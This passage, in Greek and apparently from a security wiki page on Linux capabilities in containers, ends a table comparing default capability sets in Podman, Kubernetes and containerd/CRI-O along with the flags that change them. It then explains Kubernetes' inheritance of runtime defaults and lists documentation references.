| Podman | Περιορισμένο σύνολο capabilities από προεπιλογή | Τα containers του Podman δεν είναι προνομιούχα από προεπιλογή και χρησιμοποιούν ένα περιορισμένο μοντέλο capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Κληρονομεί τις προεπιλογές του runtime, εκτός αν αλλάξουν | Αν δεν καθοριστούν `securityContext.capabilities`, το container λαμβάνει το προεπιλεγμένο σύνολο capabilities του runtime | `securityContext.capabilities.add`, παράλειψη του `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O υπό Kubernetes | Συνήθως η προεπιλογή του runtime | Το ενεργό σύνολο εξαρτάται από το runtime και τις προδιαγραφές του Pod | Όπως στη γραμμή του Kubernetes· η άμεση διαμόρφωση OCI/CRI μπορεί επίσης να προσθέσει capabilities ρητά |

Για το Kubernetes, το σημαντικό είναι ότι το API δεν ορίζει ένα καθολικό προεπιλεγμένο σύνολο capabilities. Αν το Pod δεν προσθέσει ή αφαιρέσει capabilities, το workload κληρονομεί την προεπιλογή του runtime για εκείνον τον κόμβο.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Διαμόρφωση Linux container](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Προνόμια runtime και Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Τεκμηρίωση Kubernetes - Ορισμός capabilities για ένα container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Τεκμηρίωση Podman - `--cap-add` και `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Τεκμηρίωση Incus - Ασφάλεια](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - Υλοποίηση πρωτοκόλλου Linux IPv4](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - Το πρωτόκολλο WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
